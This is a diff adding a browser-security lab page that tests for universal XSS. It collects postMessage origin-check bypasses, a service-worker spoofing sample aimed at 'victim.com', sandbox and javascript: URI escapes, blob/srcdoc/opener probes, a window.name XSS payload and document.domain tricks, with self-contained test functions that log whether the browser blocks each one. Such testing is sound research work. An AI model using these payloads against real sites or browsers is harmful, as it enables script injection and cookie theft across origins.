+<div class="card" style="border-color:var(--orange)">
+  <div class="card-hdr"><span class="badge" style="color:var(--orange)">U14</span><span class="rb rb-o">MEDIUM</span><h2>postMessage targetOrigin Bypass</h2></div>
+  <div class="alert a-b">
+    Apps yang cek origin dengan <code>startsWith</code>, <code>includes</code>, atau
+    regex yang lemah bisa dibypass. Contoh: cek <code>e.origin.includes("trusted.com")</code>
+    → bypass dengan <code>trusted.com.evil.com</code>.
+  </div>
+  <pre>// Bypasses untuk berbagai weak origin checks:
+
+// 1. includes() check
+// if (e.origin.includes("trusted.com"))  ← bypass: "trusted.com.evil.com"
+
+// 2. startsWith() check
+// if (e.origin.startsWith("https://trusted"))  ← bypass: "https://trustedX.evil.com"
+
+// 3. endsWith() check
+// if (e.origin.endsWith(".trusted.com"))  ← bypass: "evil.trusted.com" (jika attacker bisa subdomain)
+
+// 4. Regex without anchors
+// if (/trusted\.com/.test(e.origin))  ← bypass: "evil-trusted.com-evil.com"
+
+// 5. Protocol confusion
+// if (e.origin === "https://trusted.com")  ← null origin bypass via sandboxed iframe
+// sandbox iframe → origin = "null" → cek null === "https://..." → false...
+// tapi ada kasus where null origin accepted</pre>
+  <div class="bgroup">
+    <button class="btn btn-o" onclick="testU14a()">Test U14a: includes bypass</button>
+    <button class="btn btn-o" onclick="testU14b()">Test U14b: null origin</button>
+    <button class="btn btn-o" onclick="testU14c()">Test U14c: regex bypass</button>
+  </div>
+  <div class="log" id="u14-log"><span class="ll-b">→ Run test.</span></div>
+  <div class="result" id="u14-result"></div>
+</div>
+</div>
+
+<!-- ═══ U15: Service Worker ═══ -->
+<div id="sec-sw1" style="display:none">
+<div class="card" style="border-color:var(--red)">
+  <div class="card-hdr"><span class="badge" style="color:var(--red)">U15</span><span class="rb rb-r">UXSS</span><h2>Service Worker Navigation Interception</h2></div>
+  <div class="alert a-b">
+    Service Worker yang intercept navigation requests bisa serve response dengan content
+    dari origin berbeda. Bug: jika SW bisa "spoof" origin di response headers,
+    browser mungkin assign origin yang salah ke resulting document.
+  </div>
+  <pre>// SW bug scenario:
+// 1. Attacker register SW di attacker.com
+// 2. SW intercepts fetch ke https://victim.com
+// 3. SW serve response dengan body dari attacker + headers yang claim "victim.com"
+// 4. Browser assign wrong origin?
+
+// Di service-worker.js:
+self.addEventListener('fetch', event => {
+  if (event.request.url.includes('victim.com')) {
+    event.respondWith(new Response(
+      '&lt;script&gt;alert(document.domain)&lt;/script&gt;',
+      { headers: { 'Content-Type': 'text/html',
+                   'Access-Control-Allow-Origin': '*' } }
+    ));
+  }
+});
+
+// Real SW UXSS bugs: CVE-2019-5858 (Safari), multiple Chrome bugs
+// Key constraint: SW scope harus di bawah SW's own origin</pre>
+  <div class="bgroup">
+    <button class="btn btn-r" onclick="testU15a()">Test U15a: Register SW</button>
+    <button class="btn btn-r" onclick="testU15b()">Test U15b: SW scope check</button>
+  </div>
+  <div class="log" id="u15-log"><span class="ll-b">→ Requires HTTPS or localhost.</span></div>
+  <div class="result" id="u15-result"></div>
+</div>
+</div>
+
+<!-- ═══ U16: sandbox escape ═══ -->
+<div id="sec-sb1" style="display:none">
+<div class="card" style="border-color:var(--red)">
+  <div class="card-hdr"><span class="badge" style="color:var(--red)">U16</span><span class="rb rb-r">UXSS</span><h2>Sandbox allow-scripts Escape</h2></div>
+  <div class="alert a-b">
+    <code>sandbox="allow-scripts"</code> tanpa <code>allow-same-origin</code> membuat iframe
+    berjalan di unique opaque origin. Tapi ada edge cases:
+    <code>window.name</code>, postMessage ke parent, dan navigation yang bisa escape.
+  </div>
+  <pre>// Sandboxed iframe dengan allow-scripts:
+// → document.domain = "" (opaque origin)
+// → tidak bisa akses parent.document (beda origin)
+// → TAPI bisa postMessage ke parent
+
+// Bug scenario:
+// 1. Sandboxed iframe bisa navigate parent via window.parent.location?
+// 2. allow-scripts + allow-forms → bisa submit form ke parent context?
+// 3. allow-scripts + allow-modals → bisa alert() yang spoof parent origin?
+
+// Test: window.parent.location dari sandboxed iframe
+// Seharusnya: SecurityError
+// UXSS: berhasil navigate parent</pre>
+  <div class="bgroup">
+    <button class="btn btn-r" onclick="testU16a()">Test U16a: parent.location access</button>
+    <button class="btn btn-r" onclick="testU16b()">Test U16b: sandbox + alert origin</button>
+    <button class="btn btn-r" onclick="testU16c()">Test U16c: sandbox + form</button>
+  </div>
+  <div class="log" id="u16-log"><span class="ll-b">→ Run test.</span></div>
+  <div class="result" id="u16-result"></div>
+</div>
+</div>
+
+<!-- ═══ U17: allow-top-nav ═══ -->
+<div id="sec-sb2" style="display:none">
+<div class="card" style="border-color:var(--red)">
+  <div class="card-hdr"><span class="badge" style="color:var(--red)">U17</span><span class="rb rb-r">UXSS</span><h2>sandbox allow-top-navigation + javascript:</h2></div>
+  <div class="alert a-b">
+    <code>sandbox="allow-scripts allow-top-navigation"</code> memungkinkan iframe
+    navigate top-level frame. Jika iframe bisa set <code>top.location = "javascript:..."</code>
+    → JS runs di top frame's origin → UXSS. Chrome seharusnya blokir ini.
+  </div>
+  <pre>// iframe dengan allow-top-navigation:
+// → bisa set top.location (navigate parent page)
+// → tapi haruskah ini block javascript: URI?
+
+// Dalam sandboxed iframe:
+top.location = "javascript:alert(document.domain)";
+// Expected: blokir karena javascript: URI
+// UXSS: alert muncul dengan origin top frame
+
+// Variant: top.location.href = "javascript:..."
+// Variant: parent.frames[0].location = "javascript:..."
+
+// Historical: CVE-2017-5030 — sandbox allow-top-navigation bypass
+// Test apakah ada varian baru yang belum dipatch</pre>
+  <div class="bgroup">
+    <button class="btn btn-r" onclick="testU17a()">Test U17a: top.location = js:</button>
+    <button class="btn btn-r" onclick="testU17b()">Test U17b: top nav + data:</button>
+  </div>
+  <div class="log" id="u17-log"><span class="ll-b">→ Run test.</span></div>
+  <div class="result" id="u17-result"></div>
+</div>
+</div>
+
+<!-- ═══ ENV ═══ -->
+<div id="sec-env" style="display:none">
+<div class="card">
+  <div class="card-hdr"><span class="badge">ENV</span><h2>Environment Info</h2></div>
+  <div class="log" id="env-log" style="max-height:260px"><span class="ll-b">→ Click check.</span></div>
+  <button class="btn btn-g" style="margin-top:8px" onclick="runEnvCheck()">Run Check</button>
+</div>
+</div>
+
+<!-- ═══ NOTES ═══ -->
+<div id="sec-notes" style="display:none">
+<div class="card">
+  <div class="card-hdr"><span class="badge" style="color:var(--green)">NOTES</span><h2>Lab Notes</h2></div>
+  <textarea id="lab-notes" style="width:100%;background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:10px;color:var(--text);font-family:monospace;font-size:12px;resize:vertical;min-height:160px;outline:none"
+    placeholder="[U1] Chrome 126 — iframe javascript: → SecurityError immediately
+[U2] window.open(js:) → about:blank, no parent access
+[U5] about:blank inherit → origin=file:// (expected)
+[U16] sandbox+allow-scripts → parent.location throws SecurityError"></textarea>
+  <div style="display:flex;gap:8px;margin-top:8px">
+    <button class="btn btn-g" style="font-size:11px;padding:4px 10px" onclick="exportNotes()">Export</button>
+    <button class="btn" style="font-size:11px;padding:4px 10px" onclick="document.getElementById('lab-notes').value=''">Clear</button>
+  </div>
+</div>
+</div>
+
+</main>
+</div>
+
+<script>
+// ─── nav ───
+function show(id) {
+  document.querySelectorAll('.main > div').forEach(d => d.style.display = 'none');
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  const s = document.getElementById('sec-' + id);
+  if (s) s.style.display = 'block';
+  if (event && event.target) event.target.classList.add('active');
+}
+
+// ─── log / result helpers ───
+function log(id, msg, cls) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  const sp = document.createElement('span');
+  sp.className = cls || 'll-d';
+  sp.textContent = '[' + new Date().toLocaleTimeString('en',{hour12:false}) + '] ' + msg;
+  el.appendChild(sp);
+  el.appendChild(document.createElement('br'));
+  el.scrollTop = el.scrollHeight;
+}
+function result(id, msg, type) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  el.textContent = msg; el.className = 'result ' + type; el.style.display = 'block';
+}
+function setStatus(id, text, cls) {
+  const el = document.getElementById('st-' + id);
+  if (el) { el.textContent = text; el.className = 'chip ' + cls; }
+}
+
+// ─── U1: javascript: iframe src ───
+function testU1basic() {
+  const L = 'u1-log';
+  log(L,'Testing iframe src="javascript:..."', 'll-b');
+  try {
+    const f = document.createElement('iframe');
+    f.src = 'javascript:"<h1>test</h1>"';
+    f.style.cssText = 'width:0;height:0;position:fixed;opacity:0';
+    document.body.appendChild(f);
+    setTimeout(() => {
+      try {
+        const d = f.contentDocument;
+        log(L, 'iframe.contentDocument accessible: ' + !!d, 'll-y');
+        log(L, 'iframe origin: ' + (f.contentWindow.location.href || 'N/A'), 'll-y');
+        log(L, 'iframe domain: ' + (f.contentWindow.document.domain || 'N/A'), 'll-y');
+        result('u1-result', '⚠ iframe accessible — check if parent DOM accessible from inside', 'partial');
+        setStatus('u1', 'check', 'warn');
+      } catch(e) {
+        log(L, 'Cannot access iframe content: ' + e.name, 'll-g');
+        result('u1-result', '✓ Blocked — cannot access iframe contentDocument', 'blocked');
+        setStatus('u1', 'BLOCKED', 'ok');
+      }
+      f.remove();
+    }, 200);
+  } catch(e) {
+    log(L, 'Exception creating iframe: ' + e.message, 'll-g');
+    setStatus('u1', 'BLOCKED', 'ok');
+  }
+}
+
+function testU1write() {
+  const L = 'u1-log';
+  log(L, 'Testing javascript: iframe + document.write to parent...', 'll-b');
+  const marker = 'UXSS_U1_' + Date.now();
+  const f = document.createElement('iframe');
+  f.style.cssText = 'width:1px;height:1px;position:fixed;opacity:0';
+  f.src = "javascript:void(parent.document.title='" + marker + "')";
+  document.body.appendChild(f);
+  setTimeout(() => {
+    if (document.title === marker) {
+      log(L, '⚡ UXSS! parent.document.title modified from iframe!', 'll-r');
+      result('u1-result', '⚡ UXSS FOUND — iframe javascript: can access parent DOM!', 'bypass');
+      setStatus('u1', 'UXSS!', 'err');
+    } else {
+      log(L, 'parent.document.title not modified (blocked)', 'll-g');
+      result('u1-result', '✓ Blocked — parent DOM not accessible', 'blocked');
+      setStatus('u1', 'BLOCKED', 'ok');
+    }
+    f.remove();
+  }, 300);
+}
+
+function testU1parent() {
+  const L = 'u1-log';
+  log(L, 'Testing parent access from javascript: iframe via eval...', 'll-b');
+  window._u1result = null;
+  const f = document.createElement('iframe');
+  f.style.cssText = 'width:1px;height:1px;opacity:0';
+  f.src = "javascript:parent._u1result='UXSS_ACCESS_' + document.domain";
+  document.body.appendChild(f);
+  setTimeout(() => {
+    if (window._u1result && window._u1result.startsWith('UXSS')) {
+      log(L, '⚡ UXSS! iframe accessed parent: ' + window._u1result, 'll-r');
+      result('u1-result', '⚡ UXSS — iframe js: accessed parent context!', 'bypass');
+    } else {
+      log(L, 'parent._u1result not set (blocked)', 'll-g');
+      result('u1-result', '✓ Blocked — SOP enforced for javascript: iframe', 'blocked');
+    }
+    delete window._u1result; f.remove();
+  }, 400);
+}
+
+// ─── U2: window.open js: ───
+function testU2a() {
+  const L = 'u2-log';
+  log(L, 'window.open("javascript:alert(document.domain)")...', 'll-b');
+  try {
+    const w = window.open("javascript:alert(document.domain)");
+    setTimeout(() => {
+      if (w) {
+        try { log(L, 'Popup origin: ' + w.document.domain, 'll-y'); }
+        catch(e) { log(L, 'Cannot read popup: ' + e.name, 'll-g'); }
+        w.close();
+      }
+      log(L, 'Result: check if alert appeared and what domain it showed', 'll-y');
+      result('u2-result', '⚠ Check: did alert fire? What domain was shown?', 'partial');
+    }, 500);
+  } catch(e) {
+    log(L, 'Exception: ' + e.message, 'll-g');
+    result('u2-result', '✓ Blocked by browser', 'blocked');
+  }
+}
+
+function testU2b() {
+  const L = 'u2-log';
+  log(L, 'window.open("about:blank") then location = "javascript:..."...', 'll-b');
+  try {
+    const w = window.open('about:blank', '_blank', 'width=1,height=1');
+    if (w) {
+      setTimeout(() => {
+        try {
+          w.location = "javascript:void(opener._u2='UXSS_'+document.domain)";
+          setTimeout(() => {
+            if (window._u2) {
+              log(L, '⚡ UXSS via about:blank→js: ' + window._u2, 'll-r');
+              result('u2-result', '⚡ UXSS — opener accessed via about:blank + js: nav!', 'bypass');
+            } else {
+              log(L, 'No access to opener from js: URL', 'll-g');
+              result('u2-result', '✓ Blocked', 'blocked');
+            }
+            delete window._u2; w.close();
+          }, 500);
+        } catch(e) {
+          log(L, 'Blocked: ' + e.name + ': ' + e.message, 'll-g');
+          result('u2-result', '✓ Blocked — ' + e.name, 'blocked');
+          w.close();
+        }
+      }, 200);
+    }
+  } catch(e) {
+    log(L, 'window.open failed: ' + e.message, 'll-r');
+  }
+}
+
+function testU2c() {
+  const L = 'u2-log';
+  log(L, 'Testing: js: URL in location after real site navigation...', 'll-b');
+  log(L, '(Opens example.com popup — may be blocked by popup blocker)', 'll-y');
+  log(L, 'Manual test: open any site in popup, then try: popup.location="javascript:alert(document.domain)"', 'll-b');
+  result('u2-result', '⚠ Manual test needed — open target site in popup then set location = "javascript:..."', 'partial');
+}
+
+// ─── U3: location= after nav ───
+function testU3() {
+  const L = 'u3-log';
+  const f = document.getElementById('u3-frame');
+  log(L, 'Loading example.com in iframe...', 'll-b');
+  f.src = 'https://example.com';
+  f.onload = function() {
+    log(L, 'iframe loaded. Attempting: f.contentWindow.location = "javascript:..."', 'll-b');
+    try {
+      f.contentWindow.location = "javascript:alert(document.domain)";
+      log(L, 'No exception thrown — check if alert fired and with what domain', 'll-r');
+      result('u3-result', '⚠ No SecurityError — did js: navigate cross-origin frame?', 'partial');
+      setStatus('u3', 'check!', 'warn');
+    } catch(e) {
+      log(L, 'Exception: ' + e.name + ': ' + e.message, 'll-g');
+      result('u3-result', '✓ Blocked — SecurityError on cross-origin location set', 'blocked');
+      setStatus('u3', 'BLOCKED', 'ok');
+    }
+  };
+  f.onerror = () => log(L, 'iframe load failed (CORS or X-Frame-Options)', 'll-y');
+}
+
+function testU3b() {
+  const L = 'u3-log';
+  const f = document.getElementById('u3-frame');
+  log(L, 'Same-origin baseline: loading about:blank then js:...', 'll-b');
+  f.src = 'about:blank';
+  setTimeout(() => {
+    try {
+      f.contentWindow.location = "javascript:parent.document.getElementById('u3-log').innerHTML+='<span class=ll-g><br>→ js: ran in same-origin iframe</span>'";
+      log(L, 'Same-origin js: navigation succeeded (expected)', 'll-g');
+      result('u3-result', '✓ Same-origin js: works (baseline confirmed)', 'blocked');
+    } catch(e) {
+      log(L, 'Same-origin failed: ' + e.message, 'll-r');
+    }
+  }, 300);
+}
+
+// ─── U4: a[href] click ───
+function testU4a() {
+  const L = 'u4-log';
+  log(L, 'Testing: synthetic click on javascript: link...', 'll-b');
+  const marker = 'U4_UXSS_' + Date.now();
+  window._u4 = false;
+  const a = document.createElement('a');
+  a.href = "javascript:void(window._u4='" + marker + "')";
+  a.style.cssText = 'position:fixed;opacity:0;pointer-events:none';
+  document.body.appendChild(a);
+  a.click();
+  setTimeout(() => {
+    if (window._u4 === marker) {
+      log(L, 'javascript: link executed! (same-origin, expected)', 'll-y');
+      log(L, 'Key test: can this be triggered from CROSS-ORIGIN?', 'll-b');
+      result('u4-result', '⚠ js: link executed in same-origin — cross-origin test needed', 'partial');
+    } else {
+      log(L, 'javascript: link NOT executed', 'll-g');
+    }
+    delete window._u4; a.remove();
+  }, 200);
+}
+
+function testU4b() {
+  const L = 'u4-log';
+  log(L, 'Testing: a[target=_parent] javascript: from iframe...', 'll-b');
+  const f = document.createElement('iframe');
+  f.srcdoc = `<a id="lnk" href="javascript:void(parent._u4b='UXSS')">x</a>
+<script>document.getElementById('lnk').click()<\/script>`;
+  f.style.cssText = 'width:1px;height:1px;opacity:0';
+  document.body.appendChild(f);
+  setTimeout(() => {
+    if (window._u4b) {
+      log(L, '⚡ UXSS! parent._u4b set from iframe: ' + window._u4b, 'll-r');
+      result('u4-result', '⚡ UXSS — iframe js: link accessed parent!', 'bypass');
+    } else {
+      log(L, 'parent._u4b not set (expected — same-origin iframe, js: should work via srcdoc)', 'll-g');
+      log(L, 'Note: srcdoc inherits parent origin, so this is expected to work', 'll-y');
+      result('u4-result', '✓ srcdoc same-origin — expected behavior', 'blocked');
+    }
+    delete window._u4b; f.remove();
+  }, 500);
+}
+
+function testU4c() {
+  const L = 'u4-log';
+  log(L, 'Testing: sandboxed iframe a[href=js:] click...', 'll-b');
+  const f = document.createElement('iframe');
+  f.setAttribute('sandbox', 'allow-scripts allow-same-origin');
+  f.srcdoc = `<script>
+const a=document.createElement('a');
+a.href="javascript:parent._u4c='UXSS'";
+document.body.appendChild(a);
+a.click();
+<\/script>`;
+  f.style.cssText = 'width:1px;height:1px;opacity:0';
+  document.body.appendChild(f);
+  setTimeout(() => {
+    log(L, 'parent._u4c: ' + (window._u4c || 'not set'), window._u4c ? 'll-r' : 'll-g');
+    if (window._u4c) {
+      result('u4-result', '⚡ UXSS via sandboxed iframe js: link!', 'bypass');
+    } else {
+      result('u4-result', '✓ Blocked — sandboxed iframe cannot set parent properties via js:', 'blocked');
+    }
+    delete window._u4c; f.remove();
+  }, 500);
+}
+
+// ─── U5: about:blank ───
+function testU5a() {
+  const L = 'u5-log';
+  log(L, 'Testing about:blank self-open origin inheritance...', 'll-b');
+  const w = window.open('about:blank', '_blank', 'width=200,height=100');
+  if (!w) { log(L, 'Popup blocked! Allow popups for this page.', 'll-r'); return; }
+  setTimeout(() => {
+    try {
+      log(L, 'Popup document.domain: ' + w.document.domain, 'll-y');
+      log(L, 'Popup location.href: ' + w.location.href, 'll-y');
+      log(L, 'Same domain as opener: ' + (w.document.domain === document.domain), 'll-g');
+      result('u5-result', 'about:blank inherits opener origin: ' + w.document.domain, 'partial');
+      setStatus('u5', 'tested', 'warn');
+      w.close();
+    } catch(e) {
+      log(L, 'Error: ' + e.message, 'll-r'); w.close();
+    }
+  }, 300);
+}
+
+function testU5b() {
+  const L = 'u5-log';
+  log(L, 'Testing about:blank inherit chain (frame → popup → parent access)...', 'll-b');
+  const f = document.createElement('iframe');
+  f.srcdoc = `<script>
+const w = window.open('about:blank','_blank','width=1,height=1');
+if(w){
+  try {
+    parent._u5b = 'popup_domain=' + w.document.domain + ' opener_match=' + (w.opener === window);
+    w.close();
+  } catch(e) { parent._u5b = 'error:'+e.message; }
+}
+<\/script>`;
+  f.style.cssText = 'width:1px;height:1px;opacity:0';
+  document.body.appendChild(f);
+  setTimeout(() => {
+    log(L, 'Result: ' + (window._u5b || 'not set (popup may be blocked)'), 'll-y');
+    delete window._u5b; f.remove();
+  }, 800);
+}
+
+function testU5c() {
+  const L = 'u5-log';
+  log(L, 'Testing: can about:blank popup be written to from cross-origin?', 'll-b');
+  log(L, '(This requires actual cross-origin setup — documenting for manual test)', 'll-y');
+  log(L, 'Manual test: victim.com opens about:blank → attacker gets reference via opener → write to popup', 'll-b');
+  result('u5-result', '⚠ Manual test: does cross-origin page retain write access to about:blank popup?', 'partial');
+}
+
+// ─── U6: blob: ───
+function testU6a() {
+  const L = 'u6-log';
+  log(L, 'Testing blob: iframe — origin check and parent access...', 'll-b');
+  const blob = new Blob([
+    `<script>
+try {
+  parent._u6 = 'blob_domain=' + document.domain + ' location=' + location.href.substring(0,40);
+} catch(e) { parent._u6 = 'error:'+e.message; }
+<\/script>`
+  ], {type: 'text/html'});
+  const url = URL.createObjectURL(blob);
+  const f = document.createElement('iframe');
+  f.src = url;
+  f.style.cssText = 'width:1px;height:1px;opacity:0';
+  document.body.appendChild(f);
+  setTimeout(() => {
+    log(L, 'blob iframe result: ' + (window._u6 || 'not set'), 'll-y');
+    if (window._u6 && window._u6.includes('blob_domain')) {
+      log(L, '→ blob: iframe CAN access parent (same origin)', 'll-y');
+      result('u6-result', '⚠ blob: iframe shares origin with creator — can access parent DOM!', 'partial');
+      setStatus('u6', 'same-origin', 'warn');
+    }
+    URL.revokeObjectURL(url); delete window._u6; f.remove();
+  }, 500);
+}
+
+function testU6b() {
+  const L = 'u6-log';
+  log(L, 'Testing blob: URL origin — can cross-origin page fetch our blob?', 'll-b');
+  const blob = new Blob(['secret_data_12345'], {type:'text/plain'});
+  const url = URL.createObjectURL(blob);
+  log(L, 'blob URL created: ' + url.substring(0,50) + '...', 'll-b');
+  // Try fetching from sandboxed iframe (different origin)
+  const f = document.createElement('iframe');
+  f.setAttribute('sandbox', 'allow-scripts');
+  f.srcdoc = `<script>
+fetch('${url}')
+  .then(r=>r.text())
+  .then(t=>parent._u6b='READ:'+t)
+  .catch(e=>parent._u6b='BLOCKED:'+e.message);
+<\/script>`;
+  document.body.appendChild(f);
+  setTimeout(() => {
+    const r = window._u6b || 'no result';
+    log(L, 'Cross-origin blob fetch: ' + r, r.startsWith('READ') ? 'll-r' : 'll-g');
+    if (r.startsWith('READ')) {
+      result('u6-result', '⚡ UXSS — cross-origin blob: URL readable!', 'bypass');
+    } else {
+      result('u6-result', '✓ Blocked — blob: URL not accessible cross-origin', 'blocked');
+    }
+    URL.revokeObjectURL(url); delete window._u6b; f.remove();
+  }, 800);
+}
+
+function testU6c() {
+  const L = 'u6-log';
+  log(L, 'Testing: blob iframe reading parent DOM (parent.document.cookie)...', 'll-b');
+  window._u6c = null;
+  const blob = new Blob([`<script>
+try{parent._u6c='cookies='+parent.document.cookie.substring(0,50)}
+catch(e){parent._u6c='blocked:'+e.name}<\/script>`], {type:'text/html'});
+  const url = URL.createObjectURL(blob);
+  const f = document.createElement('iframe');
+  f.src = url;
+  document.body.appendChild(f);
+  setTimeout(() => {
+    log(L, 'blob→parent.document.cookie: ' + window._u6c, window._u6c && window._u6c.startsWith('cookies') ? 'll-r' : 'll-g');
+    result('u6-result', 'blob iframe parent access: ' + (window._u6c || 'no result'), window._u6c && window._u6c.startsWith('blocked') ? 'blocked' : 'partial');
+    URL.revokeObjectURL(url); delete window._u6c; f.remove();
+  }, 500);
+}
+
+// ─── U7: srcdoc ───
+function testU7a() {
+  const L = 'u7-log';
+  log(L, 'Testing srcdoc iframe parent DOM access...', 'll-b');
+  window._u7 = null;
+  const f = document.createElement('iframe');
+  f.srcdoc = `<script>
+try {
+  parent._u7 = 'PARENT_TITLE=' + parent.document.title;
+} catch(e) {
+  parent._u7 = 'blocked:' + e.message;
+}
+<\/script>`;
+  document.body.appendChild(f);
+  setTimeout(() => {
+    log(L, 'srcdoc→parent: ' + (window._u7 || 'no result'), 'll-y');
+    if (window._u7 && window._u7.startsWith('PARENT_TITLE')) {
+      log(L, '→ srcdoc can access parent (same-origin behavior, EXPECTED)', 'll-y');
+      log(L, '→ Bug if: user-controlled content in srcdoc = stored XSS in parent origin', 'll-r');
+      result('u7-result', '⚠ srcdoc inherits parent origin — any user-injected srcdoc = XSS in parent context!', 'partial');
+      setStatus('u7', 'SAME-ORIGIN', 'warn');
+    } else {
+      result('u7-result', '✓ Blocked', 'blocked');
+    }
+    delete window._u7; f.remove();
+  }, 400);
+}
+
+function testU7b() {
+  const L = 'u7-log';
+  log(L, 'Testing: sandboxed srcdoc parent access...', 'll-b');
+  window._u7b = null;
+  const f = document.createElement('iframe');
+  f.setAttribute('sandbox', 'allow-scripts');
+  f.srcdoc = `<script>
+try{parent._u7b='access:'+parent.document.title}
+catch(e){parent._u7b='blocked:'+e.name}<\/script>`;
+  document.body.appendChild(f);
+  setTimeout(() => {
+    log(L, 'sandboxed srcdoc→parent: ' + window._u7b, 'll-y');
+    result('u7-result', 'sandboxed srcdoc result: ' + (window._u7b || 'no result'), window._u7b && window._u7b.startsWith('blocked') ? 'blocked' : 'partial');
+    delete window._u7b; f.remove();
+  }, 400);
+}
+
+function testU7c() {
+  const L = 'u7-log';
+  log(L, 'Testing: nested srcdoc access chain...', 'll-b');
+  window._u7c = null;
+  const f = document.createElement('iframe');
+  f.srcdoc = `<iframe srcdoc="<script>
+  try{top._u7c='nested_top:'+top.document.title}catch(e){top._u7c='blocked:'+e.name}
+<\/script>"></iframe>`;
+  document.body.appendChild(f);
+  setTimeout(() => {
+    log(L, 'nested srcdoc→top: ' + window._u7c, 'll-y');
+    result('u7-result', 'nested srcdoc result: ' + (window._u7c || 'no result'), window._u7c && window._u7c.startsWith('blocked') ? 'blocked' : 'partial');
+    delete window._u7c; f.remove();
+  }, 600);
+}
+
+// ─── U8: opener ───
+function testU8a() {
+  const L = 'u8-log';
+  log(L, 'Testing opener.location = "javascript:..."...', 'll-b');
+  const marker = 'U8_' + Date.now();
+  window._u8check = false;
+  window.addEventListener('message', function h(e) {
+    if (e.data && e.data.includes('U8_')) {
+      log(L, 'Message from popup: ' + e.data, 'll-y');
+      window.removeEventListener('message', h);
+    }
+  });
+  const w = window.open('about:blank', '_blank', 'width=200,height=100');
+  if (!w) { log(L, 'Popup blocked!', 'll-r'); return; }
+  setTimeout(() => {
+    try {
+      w.document.write(`<script>
+try {
+  opener.location = "javascript:void(0)";
+  opener.postMessage("U8_location_set",'*');
+} catch(e) {
+  opener.postMessage("U8_blocked:"+e.name,'*');
+}
+<\/script>`);
+      log(L, 'Checking if opener.location = js: worked...', 'll-b');
+      result('u8-result', '⚠ Check log for popup result', 'partial');
+    } catch(e) {
+      log(L, 'Write to popup failed: ' + e.message, 'll-r');
+    }
+    setTimeout(() => w.close(), 2000);
+  }, 300);
+}
+
+function testU8b() {
+  const L = 'u8-log';
+  log(L, 'Testing opener navigation via location.href...', 'll-b');
+  const w = window.open('about:blank', '_blank', 'width=1,height=1');
+  if (!w) { log(L, 'Popup blocked!', 'll-r'); return; }
+  setTimeout(() => {
+    try {
+      w.document.write(`<script>
+try { opener.location.href = "javascript:void(window._u8b='UXSS')"; }
+catch(e) { opener.postMessage('opener_nav_blocked:'+e.name,'*'); }
+<\/script>`);
+    } catch(e) { log(L, 'Error: ' + e.message, 'll-r'); }
+    setTimeout(() => {
+      log(L, 'window._u8b: ' + (window._u8b || 'not set'), window._u8b ? 'll-r' : 'll-g');
+      delete window._u8b; w.close();
+    }, 500);
+  }, 300);
+}
+
+function testU8c() {
+  const L = 'u8-log';
+  log(L, 'opener.opener chain test...', 'll-b');
+  log(L, 'Manual: open popup A → popup A opens popup B → B has opener.opener = this page', 'll-y');
+  log(L, 'Test: popup B set opener.opener.location = "javascript:..."?', 'll-b');
+  result('u8-result', '⚠ Manual test: chain via popup-of-popup opener reference', 'partial');
+}
+
+// ─── U9: window.name ───
+function testU9() {
+  const L = 'u9-log';
+  log(L, 'Setting window.name = "PAYLOAD_<script>alert(1)</script>"...', 'll-b');
+  const payload = '<img src=x onerror=alert("window.name_UXSS")>';
+  window.name = payload;
+  log(L, 'window.name set to: ' + window.name.substring(0,60), 'll-y');
+  log(L, 'Now navigate to another page and come back — window.name survives!', 'll-b');
+  log(L, 'Vulnerable apps that do: innerHTML = window.name → XSS', 'll-r');
+  log(L, 'Real example: navigate to https://site-that-reads-window.name.com', 'll-b');
+  result('u9-result', '✓ window.name persists across navigation — hunt apps that read it', 'partial');
+  setStatus('u9', 'INFO', 'warn');
+}
+
+// ─── U10: history race ───
+function testU10a() {
+  const L = 'u10-log';
+  const f = document.getElementById('u10-frame');
+  log(L, 'History race test: load page, pushState, then js: + history.go(-1)...', 'll-b');
+  f.src = 'about:blank';
+  setTimeout(() => {
+    try {
+      f.contentWindow.history.pushState({p:'A'}, '', '#pageA');
+      log(L, 'pushState to #pageA done', 'll-y');
+      // Race: set location + history.go simultaneously
+      f.contentWindow.location = "javascript:void(0)";
+      f.contentWindow.history.go(-1);
+      log(L, 'js: + history.go(-1) sent simultaneously', 'll-y');
+      setTimeout(() => {
+        try {
+          log(L, 'Frame location now: ' + f.contentWindow.location.href, 'll-y');
+          result('u10-result', '⚠ No crash — check if js: ran in any specific context', 'partial');
+        } catch(e) { log(L, 'Cannot read frame: ' + e.name, 'll-g'); }
+      }, 300);
+    } catch(e) {
+      log(L, 'Exception: ' + e.message, 'll-g');
+      result('u10-result', '✓ Exception thrown: ' + e.name, 'blocked');
+    }
+  }, 200);
+}
+
+function testU10b() {
+  const L = 'u10-log';
+  const f = document.getElementById('u10-frame');
+  log(L, 'pushState race with javascript: URI + multiple history entries...', 'll-b');
+  f.src = 'about:blank';
+  setTimeout(() => {
+    for (let i = 0; i < 5; i++) {
+      f.contentWindow.history.pushState({i}, '', '#step' + i);
+    }
+    log(L, '5 history entries pushed. Trying js: + history.go(-5) race...', 'll-y');
+    try {
+      f.contentWindow.location.href = "javascript:parent._u10='UXSS_' + document.domain";
+      f.contentWindow.history.go(-5);
+      setTimeout(() => {
+        log(L, '_u10 result: ' + (window._u10 || 'not set'), window._u10 ? 'll-r' : 'll-g');
+        delete window._u10;
+      }, 500);
+    } catch(e) {
+      log(L, 'Blocked: ' + e.name, 'll-g');
+      result('u10-result', '✓ Blocked — ' + e.name, 'blocked');
+    }
+  }, 200);
+}
+
+// ─── U11: document.domain ───
+function testU11() {
+  const L = 'u11-log';
+  log(L, 'Current document.domain: ' + document.domain, 'll-b');
+  const variants = [
+    document.hostname,
+    document.hostname.split('.').slice(-2).join('.'),
+    '',
+    'com',
+    'localhost',
+    location.hostname + '.attacker.com'
+  ];
+  for (const v of variants) {
+    try {
+      const old = document.domain;
+      document.domain = v;
+      log(L, 'domain="' + v + '" → success, now: ' + document.domain, 'll-y');
+      document.domain = old; // reset attempt
+    } catch(e) {
+      log(L, 'domain="' + v + '" → ' + e.name + ': ' + e.message.substring(0,60), 'll-g');
+    }
+  }
+  result('u11-result', 'Check log — note which values were accepted', 'partial');
+}
+
+// ─── U12: document.domain="" ───
+function testU12() {
+  const L = 'u12-log';
+  log(L, 'Testing document.domain = "" (empty string)...', 'll-b');
+  const tests = [
+    ['""', () => { document.domain = ""; }],
+    ['location.hostname', () => { document.domain = location.hostname; }],
+    ['location.hostname (repeat)', () => { document.domain = location.hostname; document.domain = location.hostname; }],
+  ];
+  for (const [label, fn] of tests) {
+    try {
+      fn();
